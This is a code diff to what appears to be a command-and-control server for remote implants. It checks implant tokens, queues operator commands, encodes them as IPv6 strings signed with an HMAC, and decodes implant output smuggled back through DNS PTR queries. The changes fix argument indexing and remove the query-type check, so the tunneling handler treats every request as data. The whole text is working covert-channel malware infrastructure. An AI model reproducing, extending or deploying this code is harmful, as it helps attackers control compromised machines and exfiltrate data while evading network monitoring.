@@ -455,11 +455,11 @@ def register_routes():
             logger.info("got the token and timestamp from cookies")
             logger.info(f"info: {rcv_token}, {rcv_timestamp}, {get_imp_id}")
             if verify_auth_token(get_imp_id[0], rcv_token[0], rcv_timestamp[0]) is True:
-                operator, command = get_waiting_command(get_imp_id)
+                operator, command = get_waiting_command(get_imp_id[0])
                 if operator and command is False:
                     logger.error("operator and command in queue returned as false")
                     return "error"
-                checkout_command(get_imp_id, operator)
+                checkout_command(get_imp_id[0], operator)
                 command = json.dumps(ipv6_encoder.string_to_ipv6(command))
                 logger.info("sending command and HMAC to implant")
                 hmac_k = hmac.new(imp_psk1.encode(), command.encode(), hashlib.sha256)
@@ -520,6 +520,7 @@ def register_routes():
             dns_packet = DNSRecord.parse(dns_query)
             header = dns_packet.header
             transaction_id = header.id  # Transaction ID
+            logger.info(f"{transaction_id} sending us data")
 
             # Create the response packet
             response_packet = DNSRecord(header)
@@ -527,37 +528,31 @@ def register_routes():
             response_packet.header.qr = 1  # Query Response
             response_packet.header.aa = 1  # Authoritative Answer
             response_packet.header.ra = 1  # Recursion Available
-            query = dns_packet.q
-            qtype = QTYPE[query.qtype]  # Query type (e.g., A, PTR, etc.)
 
             # Iterate over all questions in the DNS query
             for question in dns_packet.questions:
                 qname = question.qname  # Query name
                 name_list.append(qname)
 
-            # Add response based on query type
-            if qtype == "PTR":
-                # Handle reverse DNS (PTR) query
-                decoded_list = []
-                for in_name in name_list:
-                    decoded_text = ipv6_encoder.decode_ipv6_to_text(in_name.label)
-                    decoded_list.append(decoded_text.strip('\x00'))
-                # print(ipv6_encoder.ipv6_to_string(decoded_list))
-                logger.info(f"{transaction_id} sending us data")
-                # Get the data
-                result = ' '.join(decoded_list)
-                # Check which operator is waiting for a result
-                queue = implant_checkout[str(transaction_id)]
-                operator = queue.get()
-                logger.info("got queue for operator")
-                logger.info(f"sending {operator} command")
-                handle_update(operator, transaction_id, result)
-                response_packet.add_answer(
-                    RR(rname=qname.label, rtype=QTYPE.PTR, rclass=1, ttl=300, rdata=PTR(b"example.com"))
-                )
-            else:
-                # Unsupported query type
-                response_packet.header.rcode = RCODE.NOTIMP  # Not implemented
+            # Handle reverse DNS (PTR) query
+            decoded_list = []
+            for in_name in name_list:
+                decoded_text = ipv6_encoder.decode_ipv6_to_text(in_name.label)
+                decoded_list.append(decoded_text.strip('\x00'))
+
+            # Get the data
+            result = ' '.join(decoded_list)
+            # Check which operator is waiting for a result
+            queue = implant_checkout[str(transaction_id)]
+            operator = queue.get()
+            logger.info("got queue for operator")
+            logger.info(f"sending {operator} command")
+            handle_update(operator, transaction_id, result)
+
+            # Send the implant a reply to the PTR request
+            response_packet.add_answer(
+                RR(rname=qname.label, rtype=QTYPE.PTR, rclass=1, ttl=300, rdata=PTR(b"example.com"))
+            )
 
             # Sending the response back
             response_data = response_packet.pack()
